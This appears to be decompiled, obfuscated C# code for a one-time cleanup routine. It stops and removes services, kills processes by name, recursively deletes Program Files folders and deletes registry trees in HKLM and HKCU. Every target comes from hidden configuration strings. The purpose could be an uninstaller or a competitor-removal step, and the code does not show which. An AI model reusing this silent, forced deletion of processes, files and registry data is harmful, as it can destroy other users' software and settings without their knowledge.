using System;
using System.Diagnostics;
using System.IO;
using System.Security;
using Microsoft.Win32;

internal class Class0
{
	public static Guid guid_0 = Guid.Empty;

	public static bool bool_0 = false;

	protected static void smethod_0(string string_0)
	{
		try
		{
			if (Class41.smethod_21(string_0))
			{
				IntPtr intptr_ = Class41.smethod_27(string_0, GClass0.GEnum1.flag_1 | GClass0.GEnum1.flag_2 | GClass0.GEnum1.flag_6);
				Class41.smethod_33(intptr_);
			}
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected static void smethod_1(string string_0)
	{
		try
		{
			if (Class41.smethod_21(string_0))
			{
				IntPtr intPtr = Class41.smethod_27(string_0, GClass0.GEnum1.flag_10);
				if (intPtr != IntPtr.Zero)
				{
					Class41.smethod_7(intPtr);
				}
			}
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected static void smethod_2(string string_0)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(string_0);
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				if (process.Id != Process.GetCurrentProcess().Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected static void smethod_3(string string_0)
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), string_0);
			if (Directory.Exists(path))
			{
				Directory.Delete(path, recursive: true);
			}
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected static void smethod_4(RegistryKey registryKey_0, string string_0)
	{
		try
		{
			if (guid_0 == Guid.Empty)
			{
				RegistryKey registryKey = null;
				try
				{
					registryKey = registryKey_0.OpenSubKey(string_0, writable: false);
					if (registryKey != null)
					{
						object value = registryKey.GetValue(null, null);
						if (value != null)
						{
							guid_0 = new Guid(value as string);
							if (Class11.smethod_0(null) == Guid.Empty)
							{
								Class11.smethod_2(null, guid_0);
							}
						}
					}
				}
				finally
				{
					registryKey?.Close();
				}
			}
			registryKey_0.DeleteSubKeyTree(string_0);
		}
		catch (ArgumentException)
		{
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected static void smethod_5(string string_0)
	{
		try
		{
			try
			{
				smethod_4(Registry.LocalMachine, string_0);
			}
			catch (SecurityException)
			{
			}
			smethod_4(Registry.CurrentUser, string_0);
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
		}
	}

	protected static void smethod_6()
	{
		string[] array = Class49.smethod_0(Class3.string_22, ";");
		string[] array2 = array;
		foreach (string string_ in array2)
		{
			smethod_0(string_);
		}
	}

	protected static void smethod_7()
	{
		string[] array = Class49.smethod_0(Class3.string_22, ";");
		string[] array2 = array;
		foreach (string string_ in array2)
		{
			smethod_1(string_);
		}
	}

	protected static void smethod_8()
	{
		string[] array = Class49.smethod_0(Class3.string_21, ";");
		string[] array2 = array;
		foreach (string string_ in array2)
		{
			smethod_2(string_);
		}
	}

	protected static void smethod_9()
	{
		string[] array = Class49.smethod_0(Class3.string_24, ";");
		string[] array2 = array;
		foreach (string string_ in array2)
		{
			smethod_3(string_);
		}
	}

	protected static void smethod_10()
	{
		string[] array = Class49.smethod_0(Class3.string_23, ";");
		string[] array2 = array;
		foreach (string string_ in array2)
		{
			smethod_5(string_);
		}
	}

	public static void smethod_11()
	{
		if (!bool_0)
		{
			smethod_6();
			smethod_7();
			smethod_8();
			smethod_9();
			smethod_10();
			bool_0 = true;
		}
	}
}
